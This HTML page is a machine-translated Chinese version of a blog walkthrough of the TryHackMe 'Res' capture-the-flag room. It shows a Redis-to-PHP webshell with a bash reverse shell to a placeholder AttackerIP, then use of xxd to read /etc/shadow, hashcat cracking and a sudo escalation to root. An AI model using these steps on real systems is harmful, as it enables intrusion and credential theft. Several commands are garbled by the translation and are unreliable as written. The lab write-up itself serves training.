<html>
<head>
<title>THM: Res</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">THM: Res</h1>
<blockquote>原文：<a href="https://blog.devgenius.io/thm-res-24819bd22dc7?source=collection_archive---------11-----------------------#2022-07-06">https://blog.devgenius.io/thm-res-24819bd22dc7?source=collection_archive---------11-----------------------#2022-07-06</a></blockquote><div><div class="fc ib ic id ie if"/><div class="ig ih ii ij ik"><div class=""/><figure class="gl gn jl jm jn jo gh gi paragraph-image"><div role="button" tabindex="0" class="jp jq di jr bf js"><div class="gh gi jk"><img src="../Images/ad28a812eab404a97062a4f4a46f25c8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*A8jOcfpLWG20omSez8itmg.png"/></div></div></figure><figure class="jw jx jy jz gt jo gh gi paragraph-image"><div class="gh gi jv"><img src="../Images/893c4fcc528310223521e291468c7667.png" data-original-src="https://miro.medium.com/v2/resize:fit:222/format:webp/1*gxO6DQlE7MnyzFJ0Sx9cTQ.png"/></div><figcaption class="ka kb gj gh gi kc kd bd b be z dk translated"><a class="ae ke" href="https://tryhackme.com/room/res" rel="noopener ugc nofollow" target="_blank"><strong class="bd kf"/>https://tryhackme.com/room/res</a></figcaption></figure><blockquote class="kg"><p id="1ac1" class="kh ki in bd kj kk kl km kn ko kp kq dk translated">在这个半指导性的挑战中，用内存中的数据结构入侵一个易受攻击的数据库服务器！</p></blockquote><h2 id="26cf" class="kr ks in bd kf kt ku dn kv kw kx dp ky kz la lb lc ld le lf lg lh li lj lk ll bi translated"><a class="ae ke" href="https://tryhackme.com/hacktivities?tab=practice" rel="noopener ugc nofollow" target="_blank"> Res 是 TryHackMe 首发系列</a>的一部分</h2><h1 id="14d4" class="lm ks in bd kf ln lo lp kv lq lr ls ky lt lu lv lc lw lx ly lg lz ma mb lk mc bi translated">任务 1 预定开始</h1><p id="c943" class="pw-post-body-paragraph md me in mf b mg mh mi mj mk ml mm mn kz mo mp mq ld mr ms mt lh mu mv mw kq ig bi translated">首先，在启动机器之前，如果您还没有安装 redis-tools，请在自己的机器上安装它。</p><blockquote class="mx my mz"><p id="5377" class="md me na mf b mg nb mi mj mk nc mm mn nd ne mp mq nf ng ms mt nh ni mv mw kq ig bi translated"><strong class="mf io">sudo apt-get install redis-tools</strong></p></blockquote><p id="ec8c" class="pw-post-body-paragraph md me in mf b mg nb mi mj mk nc mm mn kz ne mp mq ld ng ms mt lh ni mv mw kq ig bi translated">启动机器，请注意加载可能需要一段时间。一旦完成，继续进行<strong class="mf io"> <em class="na"> NMAP </em> </strong> <em class="na"> </em>扫描。</p><blockquote class="mx my mz"><p id="f0f1" class="md me na mf b mg nb mi mj mk nc mm mn nd ne mp mq nf ng ms mt nh ni mv mw kq ig bi translated"><strong class="mf io"> nmap -sC -sV -p- MachineIP </strong></p></blockquote><figure class="jw jx jy jz gt jo gh gi paragraph-image"><div role="button" tabindex="0" class="jp jq di jr bf js"><div class="gh gi nj"><img src="../Images/57037b8893808b459676ecaebba1fc8a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FL-a39zhwH_xa-G0KKXcxA.png"/></div></div></figure><p id="a6d4" class="pw-post-body-paragraph md me in mf b mg nb mi mj mk nc mm mn kz ne mp mq ld ng ms mt lh ni mv mw kq ig bi translated">现在下一步是什么？</p><blockquote class="kg"><p id="ea32" class="kh ki in bd kj kk nk nl nm nn no kq dk translated">给出的提示:redis-cli</p></blockquote><p id="f837" class="pw-post-body-paragraph md me in mf b mg np mi mj mk nq mm mn kz nr mp mq ld ns ms mt lh nt mv mw kq ig bi translated">我研究了一下，看看上面的命令可以运行哪些选项。</p><figure class="jw jx jy jz gt jo gh gi paragraph-image"><div class="gh gi nu"><img src="../Images/7529f88a3963278c2dfc664f1b36bb2e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1292/format:webp/1*AsUinruFBGcTzdAxRGMRrA.png"/></div></figure><p id="0b77" class="pw-post-body-paragraph md me in mf b mg nb mi mj mk nc mm mn kz ne mp mq ld ng ms mt lh ni mv mw kq ig bi translated">关于黑客<strong class="mf io"> <em class="na"> Redis，我偶然发现了<a class="ae ke" href="https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#redis-rce" rel="noopener ugc nofollow" target="_blank"> <em class="na"> HackTrick 的网站</em> </a>。</em> </strong>原来平时不需要使用凭证就可以访问服务器，下面我就是这么做的。</p><blockquote class="mx my mz"><p id="617a" class="md me na mf b mg nb mi mj mk nc mm mn nd ne mp mq nf ng ms mt nh ni mv mw kq ig bi translated">redis-cli -h MachineIP </p></blockquote><figure class="jw jx jy jz gt jo gh gi paragraph-image"><div class="gh gi nv"><img src="../Images/d709aa788baf67af160eb79f2074a3f3.png" data-original-src="https://miro.medium.com/v2/resize:fit:922/format:webp/1*fs1j-Psnj7hKMvow-1OdnQ.png"/></div><figcaption class="ka kb gj gh gi kc kd bd b be z dk translated">我忘记截屏这在我以前的尝试，因此 IP 的变化。</figcaption></figure><p id="955a" class="pw-post-body-paragraph md me in mf b mg nb mi mj mk nc mm mn kz ne mp mq ld ng ms mt lh ni mv mw kq ig bi translated">我们可以看到用户名，也许我们以后可以利用它。看着 HackTricks 网站，我看到我们可以通过 PHP 得到一个 webshell。</p><figure class="jw jx jy jz gt jo gh gi paragraph-image"><div role="button" tabindex="0" class="jp jq di jr bf js"><div class="gh gi nw"><img src="../Images/629f7a31c1de2b3c3c0effb46ed26c5f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ka7IXBsYaHiIYWMK7t5_eQ.png"/></div></div></figure><p id="7c17" class="pw-post-body-paragraph md me in mf b mg nb mi mj mk nc mm mn kz ne mp mq ld ng ms mt lh ni mv mw kq ig bi translated">既然机器有<strong class="mf io"> <em class="na">端口 80 </em> </strong>运行 http，那就用<strong class="mf io"> /var/www/html </strong>试试吧。</p><figure class="jw jx jy jz gt jo gh gi paragraph-image"><div class="gh gi nx"><img src="../Images/16b78429fc82eec703dcad953e2f0b69.png" data-original-src="https://miro.medium.com/v2/resize:fit:892/format:webp/1*WkPVZehVNJnXDRD8tKzSAQ.png"/></div><figcaption class="ka kb gj gh gi kc kd bd b be z dk translated">看到我的错别字了吗？无红利(ex-dividend)</figcaption></figure><p id="16bb" class="pw-post-body-paragraph md me in mf b mg nb mi mj mk nc mm mn kz ne mp mq ld ng ms mt lh ni mv mw kq ig bi translated">一旦完成，导航到你的浏览器，键入地址，看看它是否工作。</p><blockquote class="mx my mz"><p id="cfde" class="md me na mf b mg nb mi mj mk nc mm mn nd ne mp mq nf ng ms mt nh ni mv mw kq ig bi translated"><strong class="mf io"> MachineIP/redis.php </strong></p></blockquote><figure class="jw jx jy jz gt jo gh gi paragraph-image"><div role="button" tabindex="0" class="jp jq di jr bf js"><div class="gh gi ny"><img src="../Images/fa80734f5cd09d44c858090723206fad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tj3VDzKwkPPy0uasoPH77Q.png"/></div></div><figcaption class="ka kb gj gh gi kc kd bd b be z dk translated">现在这是工作！</figcaption></figure><p id="b28e" class="pw-post-body-paragraph md me in mf b mg nb mi mj mk nc mm mn kz ne mp mq ld ng ms mt lh ni mv mw kq ig bi translated">让我们试着产生一个壳</p><blockquote class="mx my mz"><p id="1a0e" class="md me na mf b mg nb mi mj mk nc mm mn nd ne mp mq nf ng ms mt nh ni mv mw kq ig bi translated"><strong class="mf io">配置集 dir /var/www/html </strong></p><p id="733c" class="md me na mf b mg nb mi mj mk nc mm mn nd ne mp mq nf ng ms mt nh ni mv mw kq ig bi translated"><strong class="mf io">配置设置数据库文件名 shell.php</strong></p><p id="b6a2" class="md me na mf b mg nb mi mj mk nc mm mn nd ne mp mq nf ng ms mt nh ni mv mw kq ig bi translated"><strong class="mf io">设定测试&lt;？PHP exec(\ "/bin/bash-c ' bash-I&gt;/dev/TCP/AttackerIP/Port 0&gt;&amp;1 ' \ ")；？&gt;</strong></p></blockquote><p id="ecc9" class="pw-post-body-paragraph md me in mf b mg nb mi mj mk nc mm mn kz ne mp mq ld ng ms mt lh ni mv mw kq ig bi translated">然后，在您指定的<strong class="mf io">端口</strong>上设置一个<strong class="mf io"> NetCat 监听器</strong>，并前往<strong class="mf io">shell.php</strong></p><blockquote class="mx my mz"><p id="3e83" class="md me na mf b mg nb mi mj mk nc mm mn nd ne mp mq nf ng ms mt nh ni mv mw kq ig bi translated"><strong class="mf io"> MachineIP/shell.php </strong></p></blockquote><figure class="jw jx jy jz gt jo gh gi paragraph-image"><div class="gh gi nz"><img src="../Images/c1ef9a291a5b944b4417b802b4084214.png" data-original-src="https://miro.medium.com/v2/resize:fit:1264/format:webp/1*riK3s_Pdfxkh-XX1RgtVeQ.png"/></div></figure><p id="9f11" class="pw-post-body-paragraph md me in mf b mg nb mi mj mk nc mm mn kz ne mp mq ld ng ms mt lh ni mv mw kq ig bi translated">我们进去了！</p><p id="0a96" class="pw-post-body-paragraph md me in mf b mg nb mi mj mk nc mm mn kz ne mp mq ld ng ms mt lh ni mv mw kq ig bi translated">让我们稳定一下我们的外壳！</p><blockquote class="mx my mz"><p id="5b11" class="md me na mf b mg nb mi mj mk nc mm mn nd ne mp mq nf ng ms mt nh ni mv mw kq ig bi translated"><strong class="mf io">python-c ' import pty；pty.spawn("/bin/sh")' </strong></p></blockquote><figure class="jw jx jy jz gt jo gh gi paragraph-image"><div class="gh gi oa"><img src="../Images/ba702e8fe15553249bfc6e9bf2a25820.png" data-original-src="https://miro.medium.com/v2/resize:fit:764/format:webp/1*F5fIwi7weBuXe_pfIQp62A.png"/></div></figure><p id="9540" class="pw-post-body-paragraph md me in mf b mg nb mi mj mk nc mm mn kz ne mp mq ld ng ms mt lh ni mv mw kq ig bi translated"><strong class="mf io"> CD </strong>进入 Vianka 的文件夹，抢第一面旗！</p><figure class="jw jx jy jz gt jo gh gi paragraph-image"><div class="gh gi ob"><img src="../Images/3114640cfa7cfe47732732cfe396c259.png" data-original-src="https://miro.medium.com/v2/resize:fit:722/format:webp/1*hvcF4KyO7edOvvhmorh31A.png"/></div></figure><p id="472e" class="pw-post-body-paragraph md me in mf b mg nb mi mj mk nc mm mn kz ne mp mq ld ng ms mt lh ni mv mw kq ig bi translated">我试着运行“<strong class="mf io"> sudo -l </strong>”，但由于我没有密码，我无法列出服务。接下来，我运行以下命令来检查 SUID</p><blockquote class="mx my mz"><p id="d18e" class="md me na mf b mg nb mi mj mk nc mm mn nd ne mp mq nf ng ms mt nh ni mv mw kq ig bi translated">find/-perm-u = s-type F2 &gt;/dev/null</p></blockquote><figure class="jw jx jy jz gt jo gh gi paragraph-image"><div class="gh gi oc"><img src="../Images/95b20add3f7b5230d9759633a8ed2e87.png" data-original-src="https://miro.medium.com/v2/resize:fit:1156/format:webp/1*x6IDXorNd4Bszfa8Ttz4zg.png"/></div><figcaption class="ka kb gj gh gi kc kd bd b be z dk translated"><strong class="bd kf"> /usr/bin/xxd </strong></figcaption></figure><p id="31cd" class="pw-post-body-paragraph md me in mf b mg nb mi mj mk nc mm mn kz ne mp mq ld ng ms mt lh ni mv mw kq ig bi translated">我跳到了<a class="ae ke" href="https://gtfobins.github.io" rel="noopener ugc nofollow" target="_blank"> <strong class="mf io"> GTFOBins </strong> </a>上，试着看看是否有什么我可以使用的</p><figure class="jw jx jy jz gt jo gh gi paragraph-image"><div role="button" tabindex="0" class="jp jq di jr bf js"><div class="gh gi od"><img src="../Images/866b5300294100adf3712fb9b72a11a6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4_pLC7XptJvPmt2_ek2sXA.png"/></div></div></figure><p id="9564" class="pw-post-body-paragraph md me in mf b mg nb mi mj mk nc mm mn kz ne mp mq ld ng ms mt lh ni mv mw kq ig bi translated">看起来有。让我们用这个得到<strong class="mf io"> <em class="na"> Vianka </em> </strong>的 hash。</p><blockquote class="mx my mz"><p id="7f96" class="md me na mf b mg nb mi mj mk nc mm mn nd ne mp mq nf ng ms mt nh ni mv mw kq ig bi translated"><strong class="mf io"> LFILE=/etc/shadow </strong></p><p id="ee8b" class="md me na mf b mg nb mi mj mk nc mm mn nd ne mp mq nf ng ms mt nh ni mv mw kq ig bi translated"><strong class="mf io"> xxd "$LFILE" | xxd -r </strong></p></blockquote><figure class="jw jx jy jz gt jo gh gi paragraph-image"><div role="button" tabindex="0" class="jp jq di jr bf js"><div class="gh gi oe"><img src="../Images/a4fff0511927b930e015c009bfcf6742.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Td-49NeSNaBbAbJ5D9xFLQ.png"/></div></div></figure><p id="c25d" class="pw-post-body-paragraph md me in mf b mg nb mi mj mk nc mm mn kz ne mp mq ld ng ms mt lh ni mv mw kq ig bi translated">让我们保存哈希并破解它！启动你的<strong class="mf io"> HashCat！</strong></p><blockquote class="mx my mz"><p id="388d" class="md me na mf b mg nb mi mj mk nc mm mn nd ne mp mq nf ng ms mt nh ni mv mw kq ig bi translated">hashcat-m 1800-a 0 hash file/usr/share/word lists/rock you . txt-o</p></blockquote><figure class="jw jx jy jz gt jo gh gi paragraph-image"><div role="button" tabindex="0" class="jp jq di jr bf js"><div class="gh gi of"><img src="../Images/4251086f8b55b9e395d0602c6eb1f2ef.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0tdU36Lpv3h9niTyr_lf9A.png"/></div></div></figure><figure class="jw jx jy jz gt jo gh gi paragraph-image"><div role="button" tabindex="0" class="jp jq di jr bf js"><div class="gh gi og"><img src="../Images/59c8cb6f8265cc9fba7126924986a3a3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pNrOIEszymfS9ywm_rmN3w.png"/></div></div></figure><p id="1473" class="pw-post-body-paragraph md me in mf b mg nb mi mj mk nc mm mn kz ne mp mq ld ng ms mt lh ni mv mw kq ig bi translated">密码破解！让<strong class="mf io">苏</strong>扮成<strong class="mf io">维安卡</strong></p><figure class="jw jx jy jz gt jo gh gi paragraph-image"><div class="gh gi oh"><img src="../Images/fedab6d87328ef3bf14417a00651c0d1.png" data-original-src="https://miro.medium.com/v2/resize:fit:694/format:webp/1*NHj-BvzSeo_d6-9dae0b7A.png"/></div></figure><p id="65d5" class="pw-post-body-paragraph md me in mf b mg nb mi mj mk nc mm mn kz ne mp mq ld ng ms mt lh ni mv mw kq ig bi translated">让我们看看使用<strong class="mf io"> sudo </strong>可以运行什么</p><figure class="jw jx jy jz gt jo gh gi paragraph-image"><div role="button" tabindex="0" class="jp jq di jr bf js"><div class="gh gi oi"><img src="../Images/ed6482e55647113e903e17de64f4125d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jUdy_2SZU8N-7bmgPeEFaA.png"/></div></div><figcaption class="ka kb gj gh gi kc kd bd b be z dk translated"><strong class="bd kf">全部！</strong></figcaption></figure><p id="df39" class="pw-post-body-paragraph md me in mf b mg nb mi mj mk nc mm mn kz ne mp mq ld ng ms mt lh ni mv mw kq ig bi translated">既然我们能够一起跑 sudo，现在一切都很容易。</p><blockquote class="mx my mz"><p id="3486" class="md me na mf b mg nb mi mj mk nc mm mn nd ne mp mq nf ng ms mt nh ni mv mw kq ig bi translated"><strong class="mf io">须藤素</strong></p></blockquote><figure class="jw jx jy jz gt jo gh gi paragraph-image"><div class="gh gi oj"><img src="../Images/a38853504980cf8f33095ecfdabf0181.png" data-original-src="https://miro.medium.com/v2/resize:fit:516/format:webp/1*Qd7neMSBogts1zKZ9jGBFg.png"/></div></figure><p id="82d5" class="pw-post-body-paragraph md me in mf b mg nb mi mj mk nc mm mn kz ne mp mq ld ng ms mt lh ni mv mw kq ig bi translated">现在我们来抢<strong class="mf io">根</strong>旗！</p><figure class="jw jx jy jz gt jo gh gi paragraph-image"><div class="gh gi ok"><img src="../Images/7dc7f6e69caa246155ebd4c70af5cf85.png" data-original-src="https://miro.medium.com/v2/resize:fit:592/format:webp/1*5gbfOBH2rXdF5lrlfQkwXw.png"/></div></figure><p id="77ad" class="pw-post-body-paragraph md me in mf b mg nb mi mj mk nc mm mn kz ne mp mq ld ng ms mt lh ni mv mw kq ig bi translated">这个房间到此为止！感谢大家阅读，希望这对你有所帮助。直到下次=)</p></div></div>    
</body>
</html>